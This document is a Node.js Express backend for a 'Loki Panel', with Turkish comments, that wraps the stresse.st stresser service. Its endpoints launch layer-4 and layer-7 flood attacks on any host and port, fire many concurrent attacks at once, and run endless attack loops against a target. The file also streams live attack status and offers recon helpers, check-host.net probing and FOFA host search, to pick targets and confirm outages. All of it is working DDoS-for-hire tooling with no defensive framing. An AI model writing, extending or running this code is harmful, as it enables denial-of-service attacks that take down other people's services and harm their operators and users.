/**
 * Loki Panel Backend
 * stresse.st proxy + recon/check tools
 */

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const net = require('net');
const dns = require('dns');

// Node 20'nin "Happy Eyeballs" (autoSelectFamily) ozelligi, IPv6'si bozuk/eksik
// sunucularda IPv6 denemesi sirasinda "read ECONNRESET" hatasina yol aciyor.
// Bu yuzden IPv4'u tercih edip autoSelectFamily'i kapatiyoruz.
if (typeof net.setDefaultAutoSelectFamily === 'function') {
  net.setDefaultAutoSelectFamily(false);
}
dns.setDefaultResultOrder('ipv4first');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors({
  origin: true,
  credentials: true,
  exposedHeaders: ['sessionId', 'content-type']
}));
app.use(express.json());

// Rate limiting
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  message: { status: 'error', message: 'Too many requests' }
});
app.use('/api', limiter);

// In-memory session store (single user for demo)
const sessions = {};

// Active loop registry per session: { "sessionId::loopId": { running, params, startedAt, lastRoundAt, roundCount, errors } }
const activeLoops = {};

/**
 * L4 host degerini normalize eder:
 * - URL protokolunu kaldirir (https://, http://)
 * - Icindeki port bilgisini kaldirir (host:443 -> host)
 * - Sonu / ile bitiyorsa kaldirir
 * Boylece disaridan verilen port ile cakisma olmaz.
 */
function normalizeHost(host) {
  if (!host || typeof host !== 'string') return host;
  let h = host.trim();
  h = h.replace(/^https?:\/\//i, '');
  h = h.split('/')[0];
  h = h.replace(/:\d+$/, '');
  return h;
}

/**
 * Method bazli minimum atak suresi (saniye).
 * HTTP-TEMPESTA 200 sn; diger L7 methodlar 60 sn; L4 methodlar 60 sn.
 */
const METHOD_MIN_TIME = {
  'HTTP-TEMPESTA': 200
};
const L7_MIN_TIME = 60;
const L4_MIN_TIME = 60;

function getMinTime(method, layer) {
  if (METHOD_MIN_TIME[method?.toUpperCase()]) return METHOD_MIN_TIME[method.toUpperCase()];
  if (layer === 'L7') return L7_MIN_TIME;
  return L4_MIN_TIME;
}

function isFreeMethod(method) {
  return typeof method === 'string' && method.toUpperCase().startsWith('FREE-');
}

/**
 * L7 hedef URL'yi normalize eder:
 * - Protokol yoksa https:// ekler
 * - Sonunda / yoksa ekler
 * - Varolan protokol ve path korunur
 */
function normalizeUrl(url) {
  if (!url || typeof url !== 'string') return url;
  let u = url.trim();
  if (!/^https?:\/\//i.test(u)) {
    u = 'https://' + u;
  }
  // Fazladan /path kisimlarini koruyoruz ama en azindan trailing slash olsun
  if (!u.endsWith('/')) {
    u += '/';
  }
  return u;
}

function getJar(sessionId) {
  if (!sessions[sessionId]) {
    sessions[sessionId] = new CookieJar();
  }
  return sessions[sessionId];
}

function getClient(sessionId) {
  return wrapper(axios.create({
    baseURL: 'https://stresse.st',
    jar: getJar(sessionId),
    withCredentials: true,
    family: 4,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': 'https://stresse.st',
      'Referer': 'https://stresse.st/hub'
    },
    timeout: 30000
  }));
}

// =====================
// stresse.st PROXY
// =====================

/**
 * POST /api/stresse/login
 * Body: { username, password }
 */
app.post('/api/stresse/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

    const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const client = getClient(sessionId);

    let step = 'GET /login';
    try {
      // 1. Get login page to collect cookies
      await client.get('/login');

      // 2. Submit login credentials
      step = 'POST /login';
      const loginRes = await client.post('/login', { username, password });

      // 3. Verify session
      step = 'GET /vcookie';
      const vcookieRes = await client.get('/vcookie');
      if (!vcookieRes.data || !vcookieRes.data.username) {
        return res.status(401).json({ status: 'error', message: 'Invalid credentials' });
      }

      res.json({
        status: 'success',
        sessionId,
        user: vcookieRes.data
      });
    } catch (stepErr) {
      // Hangi adimda patladigini ve stresse.st'in dondugu govdeyi acikca gorelim
      const status = stepErr.response?.status;
      const body = stepErr.response?.data;
      console.error(`Login error @ ${step}: ${stepErr.message}`);
      console.error(`  upstream status: ${status}`);
      console.error(`  upstream body:`, typeof body === 'string' ? body.slice(0, 500) : JSON.stringify(body)?.slice(0, 500));
      return res.status(502).json({
        status: 'error',
        message: `stresse.st ${step} -> ${status || 'no-response'}: ${stepErr.message}`,
        upstreamStatus: status,
        upstreamBody: typeof body === 'string' ? body.slice(0, 300) : body
      });
    }
  } catch (error) {
    console.error('Login error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/user/:username
 */
app.get('/api/stresse/user/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/user/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    console.error('User fetch error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/plan/:username
 */
app.get('/api/stresse/plan/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/plan/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    console.error('Plan fetch error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/methods
 */
app.get('/api/stresse/methods', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get('/methods.json');
    res.json(response.data);
  } catch (error) {
    console.error('Methods fetch error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/ongoing/:username
 */
app.get('/api/stresse/ongoing/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/ongoing/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    console.error('Ongoing fetch error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/attack
 * Body: { host, port, time, method, subnet, geo }
 */
app.post('/api/stresse/attack', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const client = getClient(sessionId);

    // Fetch CSRF token first
    const csrfRes = await client.get('/csrf-token');
    const csrfToken = csrfRes.data.csrfToken;

    const response = await client.post('/attack', {
      host,
      port: parseInt(port),
      time: time.toString(),
      method,
      subnet,
      geo
    }, {
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      }
    });

    // stresse.st bazen 200 OK ile { status: 'error', message: '...' } dondurebilir
    if (response.data && response.data.status === 'error') {
      return res.status(400).json({
        status: 'error',
        message: response.data.message || 'Saldiri baslatilamadi',
        data: response.data
      });
    }

    res.json(response.data);
  } catch (error) {
    console.error('Attack error:', error.message);
    if (error.response) {
      return res.status(error.response.status).json({
        status: 'error',
        message: error.response.data?.message || error.message,
        data: error.response.data
      });
    }
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/attack/bulk
 * Body: { host, port, time, method, subnet, geo, concurrents }
 *
 * Ayni hedefe concurrents kadar paralel saldiri baslatir.
 */
app.post('/api/stresse/attack/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const count = Math.max(1, parseInt(concurrents) || 1);
    const client = getClient(sessionId);

    // Tek CSRF token ile tum istekleri gonder
    const csrfRes = await client.get('/csrf-token');
    const csrfToken = csrfRes.data.csrfToken;

    const attackPayload = {
      host,
      port: parseInt(port),
      time: time.toString(),
      method,
      subnet,
      geo
    };
    const attackHeaders = {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    };

    const results = await Promise.all(
      Array.from({ length: count }, () =>
        client.post('/attack', attackPayload, { headers: attackHeaders })
          .then((r) => ({ status: 'success', data: r.data }))
          .catch((err) => ({ status: 'error', message: err.message, data: err.response?.data }))
      )
    );

    const successResults = results.filter((r) => r.status === 'success' && !(r.data?.status === 'error'));
    const failResults = results.filter((r) => r.status === 'error' || r.data?.status === 'error');

    console.log(`[attack/bulk] ${host}:${port} ${method} x${count} -> ${successResults.length} success, ${failResults.length} fail`);

    res.json({
      status: 'success',
      total: count,
      successCount: successResults.length,
      failCount: failResults.length,
      results,
      // Tek saldiriyla uyumlu donus icin ilk basarili ID
      id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null,
      attack_id: successResults[0]?.data?.id || successResults[0]?.data?.attack_id || null
    });
  } catch (error) {
    console.error('Bulk attack error:', error.message);
    if (error.response) {
      return res.status(error.response.status).json({
        status: 'error',
        message: error.response.data?.message || error.message,
        data: error.response.data
      });
    }
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/loop
 * Body: { loopId, host, port, time, method, subnet, geo, concurrents, interval, infinite }
 *
 * Non-blocking: loop'u baslatir ve hemen loopId doner. Loop arka planda calisir.
 */
app.post('/api/stresse/loop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId, port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
    const rawHost = req.body.host;
    const host = layer === 'L7' ? normalizeUrl(rawHost) : normalizeHost(rawHost);
    if (!loopId || !host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'loopId, host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
    }

    const fullLoopId = `${sessionId}::${loopId}`;
    if (activeLoops[fullLoopId] && activeLoops[fullLoopId].running) {
      return res.status(409).json({ status: 'error', message: 'Loop already running', loopId });
    }

    const client = getClient(sessionId);
    activeLoops[fullLoopId] = {
      running: true,
      params: { host, port: parseInt(port), time: parseInt(time), method, subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer },
      displayTarget: layer === 'L7' ? host : `${host}:${port}`,
      startedAt: new Date().toISOString(),
      lastRoundAt: null,
      roundCount: 0,
      errors: 0,
      roundAttackIds: []
    };

    // Loop'u arka planda calistir, response hemen donsun
    const runLoop = async () => {
      let csrfToken = null;
      try {
        const csrfRes = await client.get('/csrf-token');
        csrfToken = csrfRes.data.csrfToken;
      } catch (err) {
        console.error(`[loop ${loopId}] CSRF token alinamadi:`, err.message);
        activeLoops[fullLoopId].running = false;
        activeLoops[fullLoopId].errors += 1;
        return;
      }

      while (activeLoops[fullLoopId] && activeLoops[fullLoopId].running) {
        const loop = activeLoops[fullLoopId];
        if (!loop) break;
        loop.roundCount += 1;
        loop.lastRoundAt = new Date().toISOString();

        const round = loop.roundCount;
        const attackPayload = {
          host: loop.params.layer === 'L7' ? normalizeUrl(loop.params.host) : normalizeHost(loop.params.host),
          port: loop.params.port,
          time: loop.params.time.toString(),
          method: loop.params.method,
          subnet: loop.params.subnet,
          geo: loop.params.geo
        };
        const attackHeaders = {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        };

        // Her yeni turda once onceki tur ID'lerini temizle
        loop.roundAttackIds = [];

        // Concurrent'lari ayni anda gonder ki stresse.st hepsi ayni zaman diliminde baslasin
        const roundAttacks = [];
        for (let c = 0; c < loop.params.concurrents; c++) {
          roundAttacks.push(
            client.post('/attack', attackPayload, { headers: attackHeaders })
              .then((res) => {
                const attackId = res.data?.id || res.data?.attack_id;
                if (attackId) {
                  loop.roundAttackIds.push(attackId);
                }
                return res;
              })
              .catch((err) => {
                loop.errors += 1;
                console.error(`[loop ${loopId}] round ${round} concurrent ${c + 1} hata:`, err.message);
              })
          );
        }
        await Promise.all(roundAttacks);

        // Sonsuz loop degilse bir set calistir ve bitir
        if (!loop.params.infinite) {
          loop.running = false;
          break;
        }

        // Bir sonraki set icin bekle: time kadar (stresse.st zaten time sn saldiri yapar) + interval
        const waitTime = (loop.params.time + loop.params.interval) * 1000;
        const startWait = Date.now();
        while (activeLoops[fullLoopId] && activeLoops[fullLoopId].running && Date.now() - startWait < waitTime) {
          await new Promise(r => setTimeout(r, 500));
        }
      }
    };

    runLoop().finally(() => {
      // Loop bittiginde veya durduruldugunda kaydi sil ki listede kalmasin
      delete activeLoops[fullLoopId];
    });

    res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
  } catch (error) {
    console.error('Loop error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/stop
 * Body: { id }
 * Not: stresse.st /stop endpoint'i CSRF token istemez.
 */
app.post('/api/stresse/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { id } = req.body;
    if (!id) return res.status(400).json({ status: 'error', message: 'id required' });

    // Eger durdurulan saldiri bir loop'a aitse, o loop'u tamamen durdur ki
    // loop sonraki turda tekrar saldiri baslatmasin.
    Object.keys(activeLoops).forEach((key) => {
      if (key.startsWith(`${sessionId}::`) && activeLoops[key]?.roundAttackIds?.includes(id)) {
        activeLoops[key].running = false;
        delete activeLoops[key];
        console.log(`[stop] Loop durduruldu cunku attack ${id} durduruldu: ${key}`);
      }
    });

    const client = getClient(sessionId);
    // CSRF token gonderilirse stresse.st "Attack not found" donuyor
    const response = await client.post('/stop', { id }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 60000
    });
    res.json(response.data);
  } catch (error) {
    console.error('Stop error:', error.message);
    if (error.response) {
      return res.status(error.response.status).json({
        status: 'error',
        message: error.response.data?.message || error.message,
        data: error.response.data
      });
    }
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/stop/bulk
 * Body: { ids: [id1, id2, ...], batchSize?: number, delayMs?: number, concurrency?: number }
 * Not: stresse.st /stop endpoint'i CSRF token istemez.
 *
 * ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
 * sinirli concurrency ile paralel atar. Bu sayede cok sayida
 * saldiriyi hizli ve rate limit riskini azaltarak durdurur.
 */
app.post('/api/stresse/stop/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { ids, batchSize = 10, delayMs = 500, concurrency = 5 } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ status: 'error', message: 'ids array required' });
    }

    const size = Math.max(1, Math.min(parseInt(batchSize) || 10, 20));
    const delay = Math.max(0, Math.min(parseInt(delayMs) || 500, 5000));
    const concurrent = Math.max(1, Math.min(parseInt(concurrency) || 5, 10));

    const client = getClient(sessionId);
    const results = [];
    const totalBatches = Math.ceil(ids.length / size);

    const stopSingle = async (id) => {
      try {
        // CSRF token gonderilirse stresse.st "Attack not found" donuyor
        const response = await client.post('/stop', { id }, {
          headers: { 'Content-Type': 'application/json' },
          timeout: 60000
        });
        return { id, status: 'success', data: response.data };
      } catch (err) {
        return { id, status: 'error', message: err.message, data: err.response?.data };
      }
    };

    const runWithConcurrency = async (items, fn, limit) => {
      const out = [];
      for (let i = 0; i < items.length; i += limit) {
        const chunk = items.slice(i, i + limit);
        const chunkResults = await Promise.all(chunk.map(fn));
        out.push(...chunkResults);
        if (i + limit < items.length) {
          await new Promise((r) => setTimeout(r, 200));
        }
      }
      return out;
    };

    for (let i = 0; i < ids.length; i += size) {
      const batch = ids.slice(i, i + size);
      const currentBatch = Math.floor(i / size) + 1;

      const batchResults = await runWithConcurrency(batch, stopSingle, concurrent);
      results.push(...batchResults);

      // Durdurulan ID'lerden herhangi biri bir loop'a aitse o loop'u kapat
      const loopsToStop = new Set();
      batch.forEach((id) => {
        Object.keys(activeLoops).forEach((key) => {
          if (key.startsWith(`${sessionId}::`) && activeLoops[key]?.roundAttackIds?.includes(id)) {
            loopsToStop.add(key);
          }
        });
      });
      loopsToStop.forEach((key) => {
        activeLoops[key].running = false;
        delete activeLoops[key];
        console.log(`[stop/bulk] Loop durduruldu: ${key}`);
      });

      // Son batch degilse kisa bir bekleme (rate limit korumasi)
      if (currentBatch < totalBatches) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }

    res.json({ status: 'success', total: ids.length, results });
  } catch (error) {
    console.error('Bulk stop error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * POST /api/stresse/loop/stop
 * Body: { loopId }
 */
app.post('/api/stresse/loop/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.body;
    if (!loopId) {
      // loopId verilmezse session'a ait tum loop'lari durdur ve kayittan sil
      Object.keys(activeLoops).forEach((key) => {
        if (key.startsWith(`${sessionId}::`)) {
          activeLoops[key].running = false;
          delete activeLoops[key];
        }
      });
      return res.json({ status: 'success', message: 'Tum looplar durduruldu' });
    }

    const fullLoopId = `${sessionId}::${loopId}`;
    if (!activeLoops[fullLoopId]) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    activeLoops[fullLoopId].running = false;
    delete activeLoops[fullLoopId];
    res.json({ status: 'success', message: 'Loop durduruldu', loopId });
  } catch (error) {
    console.error('Loop stop error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/loops
 * Session'a ait aktif loop listesini doner.
 */
app.get('/api/stresse/loops', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const prefix = `${sessionId}::`;
    const loops = Object.entries(activeLoops)
      .filter(([key, value]) => key.startsWith(prefix) && value.running)
      .map(([key, value]) => ({
        loopId: key.replace(prefix, ''),
        ...value
      }));

    res.json({ status: 'success', count: loops.length, loops });
  } catch (error) {
    console.error('Loop list error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/loop/:loopId
 * Tek loop detayini doner.
 */
app.get('/api/stresse/loop/:loopId', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { loopId } = req.params;
    const fullLoopId = `${sessionId}::${loopId}`;
    const loop = activeLoops[fullLoopId];
    if (!loop) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi', loopId });
    }

    res.json({ status: 'success', loopId, ...loop });
  } catch (error) {
    console.error('Loop status error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =====================
// CHECK / RECON TOOLS
// =====================

/**
 * GET /api/check-host?host=...&type=ping|http|tcp|udp|dns
 */
app.get('/api/check-host', async (req, res) => {
  try {
    const { host, type = 'ping' } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    const validTypes = ['ping', 'http', 'tcp', 'udp', 'dns'];
    if (!validTypes.includes(type)) {
      return res.status(400).json({ status: 'error', message: 'Invalid type. Use: ping, http, tcp, udp, dns' });
    }

    // 1. İlk istek: request_id al
    const initResponse = await axios.get(`https://check-host.net/check-${type}`, {
      params: { host, max_nodes: 20 },
      headers: {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0'
      },
      timeout: 20000
    });

    const requestId = initResponse.data.request_id;
    if (!requestId) {
      return res.json({ status: 'success', data: initResponse.data });
    }

    // 2. Sonuçları bekle (max 15 saniye, 3 saniyede bir kontrol)
    let results = null;
    const maxAttempts = 5;
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(r => setTimeout(r, 3000));
      const resultResponse = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0' },
        timeout: 15000
      });

      if (resultResponse.data && Object.keys(resultResponse.data).length > 0) {
        results = resultResponse.data;
        break;
      }
    }

    res.json({
      status: 'success',
      host,
      type,
      request_id: requestId,
      results: results || {},
      raw: initResponse.data
    });
  } catch (error) {
    console.error('Check-host error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/ping-pe?host=...
 */
app.get('/api/ping-pe', async (req, res) => {
  try {
    const { host } = req.query;
    if (!host) return res.status(400).json({ status: 'error', message: 'host required' });

    // ping.pe does not expose a public API; return a reference link
    res.json({
      status: 'success',
      url: `https://ping.pe/${host}`,
      note: 'Open this link in a browser for MTR results'
    });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/fofa?query=...
 */
app.get('/api/fofa', async (req, res) => {
  try {
    const { query, email, key, size = 10 } = req.query;
    if (!query) return res.status(400).json({ status: 'error', message: 'query required' });
    if (!email || !key) {
      return res.status(400).json({ status: 'error', message: 'FOFA email and API key required' });
    }

    const encodedQuery = Buffer.from(query).toString('base64');
    const response = await axios.get('https://fofa.info/api/v1/search/all', {
      params: { email, key, qbase64: encodedQuery, size },
      timeout: 30000
    });

    res.json({ status: 'success', data: response.data });
  } catch (error) {
    console.error('FOFA error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// =====================
// LIVE ATTACK STREAM (SSE)
// =====================

/**
 * GET /api/stresse/live/:username
 * Server-Sent Events stream of ongoing attacks
 */
app.get('/api/stresse/live/:username', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  const { username } = req.params;

  if (!sessionId) {
    return res.status(401).json({ status: 'error', message: 'Session required' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');

  const client = getClient(sessionId);
  const interval = setInterval(async () => {
    try {
      const [ongoing, user] = await Promise.all([
        client.get(`/ongoing/${username}`),
        client.get(`/user/${username}`)
      ]);

      const payload = {
        timestamp: new Date().toISOString(),
        ongoing: ongoing.data,
        user: user.data
      };

      res.write(`data: ${JSON.stringify(payload)}\n\n`);
    } catch (err) {
      res.write(`event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
    }
  }, 3000);

  req.on('close', () => {
    clearInterval(interval);
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, '127.0.0.1', () => {
  console.log(`Loki backend running on http://localhost:${PORT}`);
});
